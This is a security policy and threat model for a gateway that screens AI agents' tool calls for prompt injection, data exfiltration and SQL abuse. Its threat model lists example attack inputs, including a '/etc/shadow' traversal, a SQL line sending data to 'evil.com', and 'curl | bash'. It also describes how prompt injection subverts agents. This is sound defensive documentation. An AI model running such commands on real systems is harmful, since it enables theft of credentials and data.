# Security Policy — MCP Security Gateway

## Vulnerability Disclosure

If you discover a security vulnerability, please report it privately to [vinayakk98@gmail.com] rather than opening a public GitHub issue. We will acknowledge receipt within 48 hours and aim to release a fix within 14 days for critical issues.

Please include:
- Description of the vulnerability
- Steps to reproduce
- Potential impact
- Suggested fix (if any)

---

## Threat Model

### What the Gateway is Designed to Defend Against

**Prompt Injection**
- Direct injection: attacker-controlled arguments containing instructions to override agent behavior
- Indirect injection: malicious content retrieved from external sources (documents, database results) that contains embedded instructions
- Comment/whitespace-based injection: hidden instructions in seemingly innocuous text

**Data Exfiltration**
- Wildcard file reads (`fs.read` with `path: /data/*`)
- Directory traversal (`../../etc/shadow`)
- SQL results exfiltrated to external URLs (`INTO OUTFILE 'http://evil.com/dump'`)
- Broad table dumps of PII

**Dangerous Command Execution**
- Shell command chaining via tool arguments
- `curl | bash` patterns
- Privilege escalation via path manipulation

**SQL Abuse**
- Mutation statements (INSERT, UPDATE, DELETE, DROP) via query tools
- UNION-based data exfiltration
- Full table dumps of sensitive data

**Unauthorized Access**
- Low-trust callers invoking high-privilege tools
- Cross-environment access (dev caller accessing prod tools)
- Expired or revoked API keys

---

## Security Properties

### Guaranteed by Design (Deterministic)

- **Hard policy denies cannot be bypassed by LLMs.** The `PolicyEngine` is a pure Python function with no LLM calls. Its DENY decision is final.
- **Raw tool arguments are never persisted.** Only the SHA-256 hash of raw arguments is stored. Sanitized (post-redaction) arguments may be stored.
- **Approval tokens are cryptographically random.** Generated with `secrets.token_urlsafe(32)` — 256 bits of entropy.
- **Approval tokens expire.** Redis TTL enforced; expired tokens are treated as DENIED.
- **Approval tokens are single-use.** Once a token is used (approved or denied), it cannot be reused.
- **Audit log is append-only.** No application code performs UPDATE or DELETE on `audit_events`. This is a convention enforced in `AuditLogger` — all writes go through `.write()` which only inserts.

### Best-Effort (Probabilistic)

- **LLM-based prompt injection detection.** The LLM risk classifier improves detection of novel attack patterns beyond static regex, but it is not 100% accurate. Novel techniques may evade it. The deterministic layer provides a hard floor.
- **PII redaction.** The deterministic regex-based redaction covers known PII patterns (email, SSN, credit card, AWS key format). Novel or obfuscated PII formats may not be caught.
- **Semantic argument inspection.** The ArgumentGuardAgent LLM call inspects argument semantics for hidden instructions, but adversarially crafted obfuscation may evade it.

---

## Known Limitations

| Limitation | Impact | Mitigation |
|-----------|--------|-----------|
| Post-execution output inspection | Malicious MCP server responses are not inspected | Out of scope for v1; planned for v2 |
| Novel prompt injection techniques | May evade LLM detection | Deterministic patterns provide hard floor; regularly update regex heuristics |
| Policy misconfiguration | Gaps in YAML policy could allow unintended access | Default policy is deny-by-default; CI tests cover all MVP tools |
| Redis unavailability | Approval token state lost on Redis failure | Postgres serves as durable fallback; tokens stored in both |
| LLM latency | High-latency LLM calls increase gateway overhead | Per-agent timeouts enforced; heuristics short-circuit LLM calls for obvious cases |
| SQL constraint bypass | Obfuscated SQL (e.g. via stored procedures, hex encoding) may bypass keyword checks | Defense-in-depth: both LLM classifier and deterministic checks run in parallel |

---

## Approval Token Security

Approval tokens are designed with the following properties:

1. **Generation**: `secrets.token_urlsafe(32)` — cryptographically secure random, 256 bits of entropy
2. **Storage**: Redis (live state) + Postgres (durable record). The token value itself is stored — it is not a secret key (it's a lookup key). The sensitive data is the approval decision and the associated tool call.
3. **Expiry**: Configurable TTL via `APPROVAL_TOKEN_TTL_SECONDS`. Default: 3600 (1 hour).
4. **Single-use**: Once APPROVED or DENIED, the token status is immutable.
5. **Admin-only approval**: Approval and denial endpoints require a separate admin credential. The same caller that submitted the request cannot approve their own request.
6. **Never logged**: Approval token values are not logged in application logs.

---

## Audit Log Integrity

The audit log (`audit_events` table) is designed for forensic use:

- **No raw args**: `raw_args_hash` is SHA-256 of the original arguments. The original cannot be recovered from this.
- **Append-only**: No UPDATE or DELETE on `audit_events` is performed by any application code.
- **Complete record**: Every request (allow, deny, approval, error) produces an audit event.
- **Redaction flags**: When arguments are sanitized, `redaction_flags` records what was changed and why, without storing the original sensitive value.
- **Deterministic rationale**: Every audit event records `deterministic_rationale` (from the policy engine) and optionally `llm_explanation` (from the policy reasoner). These are kept separate so the deterministic basis for every decision is always visible.

---

## API Authentication

- All endpoints except `/health` and `/readyz` require a Bearer token (API key)
- API keys are bcrypt-hashed in the `api_keys` table
- Admin endpoints (`/v1/approvals/`, `/v1/audit/`) require a separate, elevated admin token
- The admin token is a different credential from agent API keys to prevent privilege confusion
- API key values are never logged in application logs
